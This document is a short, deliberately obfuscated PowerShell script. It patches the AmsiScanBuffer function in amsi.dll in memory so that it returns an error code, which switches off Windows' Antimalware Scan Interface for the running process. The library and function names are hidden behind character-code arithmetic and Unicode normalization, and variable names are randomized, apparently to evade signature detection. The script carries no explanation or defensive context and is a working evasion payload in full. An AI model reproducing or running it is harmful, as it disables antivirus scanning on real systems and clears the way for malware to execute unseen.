$bbA = @"
using System;
using System.Runtime.InteropServices;
public class bbA {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr z_nmsU, string nxyl7CwfUymnELuz6oGY);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr yaGnclPMdx9Yxd, UIntPtr i1jSwps6rMgsv0nEmwE1, uint tHGozNLOG, out uint XdtA);
}
"@

Add-Type $bbA

$cDhRcP = [bbA]::LoadLibrary("$(('ámsî.'+'dll').nORmAlIZe([cHAr](70)+[CHar]([byte]0x6f)+[chAR]([BYtE]0x72)+[ChAr](109*5/5)+[CHAr](68*4/4)) -replace [ChAR](45+47)+[chAr](112*86/86)+[ChAR](123+43-43)+[char](77)+[chaR](5+105)+[char]([bYTe]0x7d))")
$N9CvOoZiEH = [bbA]::GetProcAddress($cDhRcP, "$([cHaR]([bYTE]0x41)+[Char](76+33)+[ChAR]([bytE]0x73)+[ChAr](105)+[CHAR]([Byte]0x53)+[Char](99+35-35)+[ChaR]([ByTE]0x61)+[ChaR]([BYtE]0x6e)+[CHAR](66)+[chaR](117+41-41)+[chAR](102+2-2)+[chAr](102+5-5)+[CHar](101*62/62)+[ChAR]([BYte]0x72))")
$p = 0
[bbA]::VirtualProtect($N9CvOoZiEH, [uint32]5, 0x40, [ref]$p)
$utC = "0xB8"
$j7YeHbALUYp = "0x57"
$Gck = "0x00"
$lPtHEVga3fK = "0x07"
$aY2QdLb4X73P = "0x80"
$NXwd1O = "0xC3"
$xEfNOvYWdTPvaXXPL = [Byte[]] ($utC,$j7YeHbALUYp,$Gck,$lPtHEVga3fK,+$aY2QdLb4X73P,+$NXwd1O)
[System.Runtime.InteropServices.Marshal]::Copy($xEfNOvYWdTPvaXXPL, 0, $N9CvOoZiEH, 6)